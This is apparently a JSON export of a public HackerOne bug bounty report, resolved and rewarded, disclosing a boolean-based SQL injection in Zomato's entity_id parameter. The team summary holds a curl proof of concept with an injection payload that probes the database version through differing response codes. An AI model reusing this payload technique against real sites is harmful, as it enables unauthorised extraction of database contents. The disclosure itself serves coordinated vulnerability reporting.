{"id":297534,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTc1MzQ=","url":"https://hackerone.com/reports/297534","title":"[www.zomato.com] Boolean SQLi - /█████.php","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-12-13T15:38:03.322Z","submitted_at":"2017-12-13T15:38:03.322Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"gerben_javado","url":"/gerben_javado","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/nxCLVa5sJm5BsdGjBdqzDfg8/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2943,"url":"https://hackerone.com/zomato","handle":"zomato","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Zomato","twitter_handle":"Zomato","website":"https://www.zomato.com","about":"The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-03-29T16:51:52.391Z","bug_reporter_agreed_on_going_public_at":"2018-03-29T13:44:23.986Z","team_member_agreed_on_going_public_at":"2018-03-29T16:51:52.020Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","vulnerability_information_html":"","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-04-28T13:44:24.551Z","allow_singular_disclosure_after":-84296596.9547413,"singular_disclosure_allowed":true,"vote_count":34,"voters":["sp1d3rs","europa","michiel","muon4","ramsexy","s_p_q_r","flashdisk","nullcod3r","edoverflow","powerjacobb1","and 24 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2222177,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-14T09:54:30.728Z","updated_at":"2017-12-14T09:54:30.728Z","actor":{"username":"chicken-tikka","cleared":false,"url":"/chicken-tikka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/568/cdbb30fd8932f00a06868a737ab5bdc5c57e5f00_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2341333,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-01T08:50:16.637Z","updated_at":"2018-02-01T08:51:11.515Z","actor":{"username":"gerben_javado","cleared":false,"url":"/gerben_javado","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/nxCLVa5sJm5BsdGjBdqzDfg8/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2341525,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-01T10:56:29.830Z","updated_at":"2018-02-01T10:56:29.830Z","actor":{"username":"chicken-tikka","cleared":false,"url":"/chicken-tikka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/568/cdbb30fd8932f00a06868a737ab5bdc5c57e5f00_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"gerben_javado","url":"/gerben_javado"},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2341526,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-01T10:56:44.809Z","updated_at":"2018-02-01T10:56:44.809Z","actor":{"url":"/zomato","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Zomato"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"zomato","collaborator":{"username":"gerben_javado","url":"/gerben_javado"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2544191,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-29T13:44:24.036Z","updated_at":"2018-03-29T13:44:24.036Z","first_to_agree":true,"actor":{"username":"gerben_javado","cleared":false,"url":"/gerben_javado","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/nxCLVa5sJm5BsdGjBdqzDfg8/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2544630,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-29T16:51:52.063Z","updated_at":"2018-03-29T16:51:52.063Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2544631,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-29T16:51:52.417Z","updated_at":"2018-03-29T16:51:52.417Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":6991,"category":"team","content":"@gerben_javado found that the parameter entity_id was vulnerable to SQLi on endpoint /████.php using a Boolean technique.\n\n##POC\n\nThe POC uses `if(mid(@@version,1,1)=5` which returns a 200 ok message. If changed for `if(mid(@@version,1,1)=4` the server gives a 500 or 504 error, confirming the SQLi and proving data extraction.\n\n```\ncurl -H 'Host: www.zomato.com' -H 'Cookie: PHPSESSID=XXXXX' 'https://www.zomato.com/████.php?entity_type=restaurant\u0026entity_id=1+or+if(mid(@@version,1,1)=5,1,2)=2%23' -k\n```\n\nThanks @gerben_javado for helping us in keeping @zomato secure :)","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003e\u003ca href=\"/gerben_javado\"\u003e@gerben_javado\u003c/a\u003e found that the parameter entity_id was vulnerable to SQLi on endpoint /████.php using a Boolean technique.\u003c/p\u003e\n\n\u003ch2 id=\"poc\"\u003ePOC\u003c/h2\u003e\n\n\u003cp\u003eThe POC uses \u003ccode\u003eif(mid(@@version,1,1)=5\u003c/code\u003e which returns a 200 ok message. If changed for \u003ccode\u003eif(mid(@@version,1,1)=4\u003c/code\u003e the server gives a 500 or 504 error, confirming the SQLi and proving data extraction.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -H \u0026#39;Host: www.zomato.com\u0026#39; -H \u0026#39;Cookie: PHPSESSID=XXXXX\u0026#39; \u0026#39;https://www.zomato.com/████.php?entity_type=restaurant\u0026amp;entity_id=1+or+if(mid(@@version,1,1)=5,1,2)=2%23\u0026#39; -k\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThanks \u003ca href=\"/gerben_javado\"\u003e@gerben_javado\u003c/a\u003e for helping us in keeping \u003ca href=\"/zomato\"\u003e@zomato\u003c/a\u003e secure :)\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}